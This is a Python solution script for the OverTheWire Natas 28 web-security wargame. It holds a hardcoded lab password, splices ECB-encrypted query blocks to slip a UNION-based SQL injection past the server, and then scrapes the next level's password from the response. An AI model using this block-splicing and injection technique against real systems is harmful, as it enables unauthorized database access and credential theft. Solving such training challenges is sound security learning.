import requests
import base64
import urllib.parse
import re

URL = "http://natas28.natas.labs.overthewire.org"
USERNAME = "natas28"
PASSWORD = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"
SQLI = "\' UNION ALL SELECT password FROM users; # -- "


class query():
    def get_query_vallue(url):
        '''Get the value of the query from url, and parse it to hex'''
        url = urllib.parse.urlparse(url).query
        query = urllib.parse.parse_qs(url)['query'][0]
        query = base64.b64decode(query).hex()
        return query

    def craft_query(query):
        '''Make hex to readable base64, that server can read'''
        query = bytearray.fromhex(query)
        query = base64.b64encode(query).decode('utf-8')
        query = urllib.parse.quote(query)
        return query


def init_session():
    '''init requests session'''
    s = requests.Session()
    s.auth = (USERNAME, PASSWORD)
    return s


def get_payload():
    Session = init_session()
    r = Session.post(URL, data={'query': 'A' * 25 + SQLI, 'submit': 'submit'}) # 9-25-41... will work
    malicious = query.get_query_vallue(r.url)
    r = Session.post(URL, data={'query': 'A' * 26, 'submit': 'submit'}) # 10-26-42... will work
    clean = query.get_query_vallue(r.url)

    # starting from 3, add 1 per 16 block, it's 4 cause we have used 26
    crafted = clean[: (4 * 32)]
    # starting from 3, add 1 per 16 block, it's 4 cause we have used 25
    crafted += malicious[(4 * 32):]

    payload = query.craft_query(crafted)
    return payload


def main():
    payload = get_payload()
    
    s = init_session()
    r = s.get(URL+"/search.php?query="+payload)
    matchObject = re.search('((?!%s)[a-zA-Z0-9]{32})' % PASSWORD, r.text)
    print(matchObject.group(1))


if __name__ == "__main__":
    main()
